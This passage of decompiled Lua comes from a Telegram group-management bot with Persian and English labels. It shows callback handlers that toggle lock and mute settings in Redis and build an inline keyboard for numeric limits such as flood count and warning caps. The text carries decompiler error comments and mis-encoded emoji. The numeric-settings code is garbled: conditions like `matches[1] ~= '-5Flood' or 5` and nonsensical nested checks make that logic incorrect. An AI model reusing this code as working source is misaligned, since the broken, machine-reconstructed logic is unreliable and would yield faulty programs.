{
{text = "🗂 بخش اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "🛠 سایر ابزار ها", callback_data = "Tools:" .. matches[2]}
}
, 
{
{text = "👤 بخش پشتیبانی", callback_data = "Support:" .. matches[2]}
}
, 
{
{text = "[ بستن ]", callback_data = "Exit:" .. matches[2]}
}
}
              end
              edit_inline(msg.message_id, text, keyboard)
            end
            if matches[1] == "NoProcess" then
              if not lang then
                get_alert(msg.cb_id, "No Process Found!")
              else
                get_alert(msg.cb_id, "فرآیندی یافت نشد!")
              end
            end
            if matches[1] == "Exit" then
              redis:del("WorkWithManager:" .. msg.message_id .. ":" .. matches[2])
              if not lang then
                text = "Manager of `" .. matches[2] .. "` Group Has Been Closed By " .. (msg.from).name
              else
                text = "مدیریت گروه `" .. matches[2] .. "` توسط " .. (msg.from).name .. " بسته شد"
              end
              edit_inline(msg.message_id, text)
            end
            if matches[1] == "mute_all" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "All Unlocked")
                else
                  get_alert(msg.cb_id, "چت باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "All Locked")
                else
                  get_alert(msg.cb_id, "چت قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_gif" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Gif Unlocked")
                else
                  get_alert(msg.cb_id, "گیف باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Gif Locked")
                else
                  get_alert(msg.cb_id, "گیف قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_text" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Text Unlocked")
                else
                  get_alert(msg.cb_id, "متن باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Text Locked")
                else
                  get_alert(msg.cb_id, "متن قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_photo" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Photo Unlocked")
                else
                  get_alert(msg.cb_id, "عکس باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Photo Locked")
                else
                  get_alert(msg.cb_id, "عکس قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_video" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Video Unlocked")
                else
                  get_alert(msg.cb_id, "فیلم باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Video Locked")
                else
                  get_alert(msg.cb_id, "فیلم قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_audio" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Audio Unlocked")
                else
                  get_alert(msg.cb_id, "آهنگ باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Audio Locked")
                else
                  get_alert(msg.cb_id, "آهنگ قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_voice" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Voice Unlocked")
                else
                  get_alert(msg.cb_id, "صدا باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Voice Locked")
                else
                  get_alert(msg.cb_id, "صدا قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_sticker" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Sticker Unlocked")
                else
                  get_alert(msg.cb_id, "استیکر باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Sticker Locked")
                else
                  get_alert(msg.cb_id, "استیکر قفل شد")
                end
              end
              GetSettings3(msg, matches[2])
            end
            if matches[1] == "mute_contact" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Contact Unlocked")
                else
                  get_alert(msg.cb_id, "مخاطب باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Contact Locked")
                else
                  get_alert(msg.cb_id, "مخاطب قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "mute_forward" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Forward Unlocked")
                else
                  get_alert(msg.cb_id, "فوروارد باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Forward Locked")
                else
                  get_alert(msg.cb_id, "فوروارد قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "mute_location" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Location Unlocked")
                else
                  get_alert(msg.cb_id, "مکان باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Location Locked")
                else
                  get_alert(msg.cb_id, "مکان قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "mute_document" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Document Unlocked")
                else
                  get_alert(msg.cb_id, "فایل باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Document Locked")
                else
                  get_alert(msg.cb_id, "فایل قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "mute_tgservice" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Tgservice Unlocked")
                else
                  get_alert(msg.cb_id, "خدمات تلگرام باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Tgservice Locked")
                else
                  get_alert(msg.cb_id, "خدمات تلگرام قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "mute_inline" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "inline Unlocked")
                else
                  get_alert(msg.cb_id, "اینلاین باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "inline Locked")
                else
                  get_alert(msg.cb_id, "اینلاین قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "mute_game" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Game Unlocked")
                else
                  get_alert(msg.cb_id, "بازی باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Game Locked")
                else
                  get_alert(msg.cb_id, "بازی قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "mute_keyboard" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Keyboard Unlocked")
                else
                  get_alert(msg.cb_id, "کیبورد باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Keyboard Locked")
                else
                  get_alert(msg.cb_id, "کیبورد قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "lock_link" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Link Unlocked")
                else
                  get_alert(msg.cb_id, "لینک باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Link Locked")
                else
                  get_alert(msg.cb_id, "لینک قفل شد")
                end
              end
              GetSettings(msg, matches[2])
            end
            if matches[1] == "lock_tag" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Tag Unlocked")
                else
                  get_alert(msg.cb_id, "تگ باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Tag Locked")
                else
                  get_alert(msg.cb_id, "تگ قفل شد")
                end
              end
              GetSettings(msg, matches[2])
            end
            if matches[1] == "lock_username" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "UserName Unlocked")
                else
                  get_alert(msg.cb_id, "یوزرنیم باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "UserName Locked")
                else
                  get_alert(msg.cb_id, "یوزرنیم قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "lock_join" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Join Unlocked")
                else
                  get_alert(msg.cb_id, "ورود باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Join Locked")
                else
                  get_alert(msg.cb_id, "ورود قفل شد")
                end
              end
              GetSettings4(msg, matches[2])
            end
            if matches[1] == "lock_mention" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Mention Unlocked")
                else
                  get_alert(msg.cb_id, "منشن باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Mention Locked")
                else
                  get_alert(msg.cb_id, "منشن قفل شد")
                end
              end
              GetSettings(msg, matches[2])
            end
            if matches[1] == "lock_arabic" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Arabic Unlocked")
                else
                  get_alert(msg.cb_id, "عربی باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Arabic Locked")
                else
                  get_alert(msg.cb_id, "عربی قفل شد")
                end
              end
              GetSettings(msg, matches[2])
            end
            if matches[1] == "lock_edit" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Edit Unlocked")
                else
                  get_alert(msg.cb_id, "ادیت باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Edit Locked")
                else
                  get_alert(msg.cb_id, "ادیت قفل شد")
                end
              end
              GetSettings(msg, matches[2])
              if not lang then
                get_alert(msg.cb_id, "Lock items > Page 1")
              else
                get_alert(msg.cb_id, "آیتم های قفل > صفحه 1")
              end
            end
            if matches[1] == "lock_spam" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Spam Unlocked")
                else
                  get_alert(msg.cb_id, "اسپم باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Spam Locked")
                else
                  get_alert(msg.cb_id, "اسپم قفل شد")
                end
              end
              GetSettings(msg, matches[2])
            end
            if matches[1] == "lock_flood" then
              if redis:hget("GroupSettings:" .. matches[2], "flood") == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], "flood")
                if not lang then
                  get_alert(msg.cb_id, "Flood Unlocked")
                else
                  get_alert(msg.cb_id, "پیام رگباری باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], "flood", "yes")
                if not lang then
                  get_alert(msg.cb_id, "Flood Locked")
                else
                  get_alert(msg.cb_id, "پیام رگباری قفل شد")
                end
              end
              GetSettings(msg, matches[2])
            end
            if matches[1] == "lock_bots" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Bots Unlocked")
                else
                  get_alert(msg.cb_id, "ربات ها باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Bots Locked")
                else
                  get_alert(msg.cb_id, "ربات ها قفل شد")
                end
              end
              GetSettings(msg, matches[2])
            end
            if matches[1] == "lock_markdown" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Markdown Unlocked")
                else
                  get_alert(msg.cb_id, "فونت باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Markdown Locked")
                else
                  get_alert(msg.cb_id, "فونت قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            if matches[1] == "lock_webpage" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Webpage Unlocked")
                else
                  get_alert(msg.cb_id, "صفحات وب باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Webpage Locked")
                else
                  get_alert(msg.cb_id, "صفحات وب قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            if matches[1] == "lock_pin" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Pin Unlocked")
                else
                  get_alert(msg.cb_id, "پین باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Pin Locked")
                else
                  get_alert(msg.cb_id, "پین قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            if matches[1] == "lock_MaxWords" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "MaxWords Unlocked")
                else
                  get_alert(msg.cb_id, "حداکثر کلمات باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "MaxWords Locked")
                else
                  get_alert(msg.cb_id, "حداکثر کلمات قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            if matches[1] == "lock_botchat" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "BotChat Unlocked")
                else
                  get_alert(msg.cb_id, "چت ربات باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "BotChat Locked")
                else
                  get_alert(msg.cb_id, "چت ربات قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            if matches[1] == "lock_fohsh" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "Fohsh Unlocked")
                else
                  get_alert(msg.cb_id, "فحش باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "Fohsh Locked")
                else
                  get_alert(msg.cb_id, "فحش قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            if matches[1] == "lock_english" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "English Unlocked")
                else
                  get_alert(msg.cb_id, "انگلیسی باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "English Locked")
                else
                  get_alert(msg.cb_id, "انگلیسی قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            if matches[1] == "lock_forcedinvite" then
              if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
                redis:hdel("GroupSettings:" .. matches[2], matches[1])
                if not lang then
                  get_alert(msg.cb_id, "ForcedInvite Unlocked")
                else
                  get_alert(msg.cb_id, "دعوت اجباری باز شد")
                end
              else
                redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
                if not lang then
                  get_alert(msg.cb_id, "ForcedInvite Locked")
                else
                  get_alert(msg.cb_id, "دعوت اجباری قفل شد")
                end
              end
              GetSettings2(msg, matches[2])
            end
            _ENV.GetNumberSettings = function(msg, chat)
    -- function num : 0_58_19 , upvalues : _ENV, lang
    NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. chat, "num_msg_max")) or 5
    MaxWords = tonumber(redis:hget("GroupSettings:" .. chat, "MaxWords")) or 50
    MaxWarn = tonumber(redis:hget("GroupSettings:" .. chat, "MaxWarn")) or 5
    FloodTime = tonumber(redis:hget("GroupSettings:" .. chat, "FloodTime")) or 30
    ForcedInvite = tonumber(redis:hget("GroupSettings:" .. chat, "ForcedInvite")) or 2
    keyboard = {}
    if not lang then
      text = "`Please Use An item For Change Number:`"
      -- DECOMPILER ERROR at PC267: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "💀 Number of Flood: " .. NUM_MSG_MAX, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5Flood:" .. chat}
, 
{text = "-1", callback_data = "-1Flood:" .. chat}
, 
{text = "+1", callback_data = "+1Flood:" .. chat}
, 
{text = "+5", callback_data = "+5Flood:" .. chat}
}
, 
{
{text = "🕰 Flood Time: " .. FloodTime, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5FloodTime:" .. chat}
, 
{text = "-1", callback_data = "-1FloodTime:" .. chat}
, 
{text = "+1", callback_data = "+1FloodTime:" .. chat}
, 
{text = "+5", callback_data = "+5FloodTime:" .. chat}
}
, 
{
{text = "⚠️ Max Warn: " .. MaxWarn, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5MaxWarn:" .. chat}
, 
{text = "-1", callback_data = "-1MaxWarn:" .. chat}
, 
{text = "+1", callback_data = "+1MaxWarn:" .. chat}
, 
{text = "+5", callback_data = "+5MaxWarn:" .. chat}
}
, 
{
{text = "🔠 Max Words: " .. MaxWords, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-100", callback_data = "-100MaxWords:" .. chat}
, 
{text = "-10", callback_data = "-10MaxWords:" .. chat}
, 
{text = "+10", callback_data = "+10MaxWords:" .. chat}
, 
{text = "+100", callback_data = "+100MaxWords:" .. chat}
}
, 
{
{text = "🚷 Forced invite: " .. ForcedInvite, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5Forced:" .. chat}
, 
{text = "-1", callback_data = "-1Forced:" .. chat}
, 
{text = "+1", callback_data = "+1Forced:" .. chat}
, 
{text = "+5", callback_data = "+5Forced:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
    else
      text = "`لطفا یک بخش را برای تغییر عدد انتخاب کنید:`"
      -- DECOMPILER ERROR at PC466: Confused about usage of register: R2 in 'UnsetPending'

      keyboard.inline_keyboard = {
{
{text = "💀 تعداد پیام رگباری: " .. NUM_MSG_MAX, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5Flood:" .. chat}
, 
{text = "-1", callback_data = "-1Flood:" .. chat}
, 
{text = "+1", callback_data = "+1Flood:" .. chat}
, 
{text = "+5", callback_data = "+5Flood:" .. chat}
}
, 
{
{text = "🕰 زمان پیام رگباری: " .. FloodTime, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5FloodTime:" .. chat}
, 
{text = "-1", callback_data = "-1FloodTime:" .. chat}
, 
{text = "+1", callback_data = "+1FloodTime:" .. chat}
, 
{text = "+5", callback_data = "+5FloodTime:" .. chat}
}
, 
{
{text = "⚠️ حداکثر اخطار: " .. MaxWarn, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5MaxWarn:" .. chat}
, 
{text = "-1", callback_data = "-1MaxWarn:" .. chat}
, 
{text = "+1", callback_data = "+1MaxWarn:" .. chat}
, 
{text = "+5", callback_data = "+5MaxWarn:" .. chat}
}
, 
{
{text = "🔠 حداکثر کلمات در جمله: " .. MaxWords, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-100", callback_data = "-100MaxWords:" .. chat}
, 
{text = "-10", callback_data = "-10MaxWords:" .. chat}
, 
{text = "+10", callback_data = "+10MaxWords:" .. chat}
, 
{text = "+100", callback_data = "+100MaxWords:" .. chat}
}
, 
{
{text = "🚷 تعداد دعوت اجباری: " .. ForcedInvite, callback_data = "NoProcess:" .. chat}
}
, 
{
{text = "-5", callback_data = "-5Forced:" .. chat}
, 
{text = "-1", callback_data = "-1Forced:" .. chat}
, 
{text = "+1", callback_data = "+1Forced:" .. chat}
, 
{text = "+5", callback_data = "+5Forced:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
    end
    edit_inline(msg.message_id, text, keyboard)
  end

            if matches[1] == "NumberSettings" then
              (_ENV.GetNumberSettings)(msg, matches[2])
            end
            if not tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) then
              _ENV.String = matches[1] ~= "-5Flood" or 5
              if _ENV.String - 5 < 1 then
                if not lang then
                  get_alert(msg.cb_id, "Input Number is Not Correct!")
                else
                  get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                end
              else
                if _ENV.String - 5 >= 1 then
                  redis:hset("GroupSettings:" .. matches[2], "num_msg_max", _ENV.String - 5)
                end
              end
              ;
              (_ENV.GetNumberSettings)(msg, matches[2])
              if not tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) then
                _ENV.String = matches[1] ~= "-1Flood" or 5
                if _ENV.String - 1 < 1 then
                  if not lang then
                    get_alert(msg.cb_id, "Input Number is Not Correct!")
                  else
                    get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                  end
                else
                  if _ENV.String - 1 >= 1 then
                    redis:hset("GroupSettings:" .. matches[2], "num_msg_max", _ENV.String - 1)
                  end
                end
                ;
                (_ENV.GetNumberSettings)(msg, matches[2])
                if not tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) then
                  _ENV.String = matches[1] ~= "+1Flood" or 5
                  if 200 < _ENV.String + 1 then
                    if not lang then
                      get_alert(msg.cb_id, "Input Number is Not Correct!")
                    else
                      get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                    end
                  else
                    if _ENV.String + 1 <= 200 then
                      redis:hset("GroupSettings:" .. matches[2], "num_msg_max", _ENV.String + 1)
                    end
                  end
                  ;
                  (_ENV.GetNumberSettings)(msg, matches[2])
                  if not tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) then
                    _ENV.String = matches[1] ~= "+5Flood" or 5
                    if 200 < _ENV.String + 5 then
                      if not lang then
                        get_alert(msg.cb_id, "Input Number is Not Correct!")
                      else
                        get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                      end
                    else
                      if _ENV.String + 5 <= 200 then
                        redis:hset("GroupSettings:" .. matches[2], "num_msg_max", _ENV.String + 5)
                      end
                    end
                    ;
                    (_ENV.GetNumberSettings)(msg, matches[2])
                    if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) then
                      _ENV.String = matches[1] ~= "-5MaxWarn" or 5
                      if _ENV.String - 5 < 2 then
                        if not lang then
                          get_alert(msg.cb_id, "Input Number is Not Correct!")
                        else
                          get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                        end
                      else
                        if _ENV.String - 5 >= 2 then
                          redis:hset("GroupSettings:" .. matches[2], "MaxWarn", _ENV.String - 5)
                        end
                      end
                      ;
                      (_ENV.GetNumberSettings)(msg, matches[2])
                      if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) then
                        _ENV.String = matches[1] ~= "-1MaxWarn" or 5
                        if _ENV.String - 1 < 2 then
                          if not lang then
                            get_alert(msg.cb_id, "Input Number is Not Correct!")
                          else
                            get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                          end
                        else
                          if _ENV.String - 1 >= 2 then
                            redis:hset("GroupSettings:" .. matches[2], "MaxWarn", _ENV.String - 1)
                          end
                        end
                        ;
                        (_ENV.GetNumberSettings)(msg, matches[2])
                        if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) then
                          _ENV.String = matches[1] ~= "+1MaxWarn" or 5
                          redis:hset("GroupSettings:" .. matches[2], "MaxWarn", _ENV.String + 1)
                          ;
                          (_ENV.GetNumberSettings)(msg, matches[2])
                          if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) then
                            _ENV.String = matches[1] ~= "+5MaxWarn" or 5
                            redis:hset("GroupSettings:" .. matches[2], "MaxWarn", _ENV.String + 5)
                            ;
                            (_ENV.GetNumberSettings)(msg, matches[2])
                            if not tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) then
                              _ENV.String = matches[1] ~= "-5FloodTime" or 30
                              if _ENV.String - 5 < 5 then
                                if not lang then
                                  get_alert(msg.cb_id, "Input Number is Not Correct!")
                                else
                                  get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                                end
                              else
                                if 5 <= _ENV.String - 5 then
                                  redis:hset("GroupSettings:" .. matches[2], "FloodTime", _ENV.String - 5)
                                end
                              end
                              ;
                              (_ENV.GetNumberSettings)(msg, matches[2])
                              if not tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) then
                                _ENV.String = matches[1] ~= "-1FloodTime" or 30
                                if _ENV.String - 1 < 5 then
                                  if not lang then
                                    get_alert(msg.cb_id, "Input Number is Not Correct!")
                                  else
                                    get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                                  end
                                else
                                  if 5 <= _ENV.String - 1 then
                                    redis:hset("GroupSettings:" .. matches[2], "FloodTime", _ENV.String - 1)
                                  end
                                end
                                ;
                                (_ENV.GetNumberSettings)(msg, matches[2])
                                if not tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) then
                                  _ENV.String = matches[1] ~= "+1FloodTime" or 30
                                  redis:hset("GroupSettings:" .. matches[2], "FloodTime", _ENV.String + 1)
                                  ;
                                  (_ENV.GetNumberSettings)(msg, matches[2])
                                  if not tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) then
                                    _ENV.String = matches[1] ~= "+5FloodTime" or 30
                                    redis:hset("GroupSettings:" .. matches[2], "FloodTime", _ENV.String + 5)
                                    ;
                                    (_ENV.GetNumberSettings)(msg, matches[2])
                                    if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) then
                                      _ENV.String = matches[1] ~= "-100MaxWords" or 50
                                      if _ENV.String - 100 < 10 then
                                        if not lang then
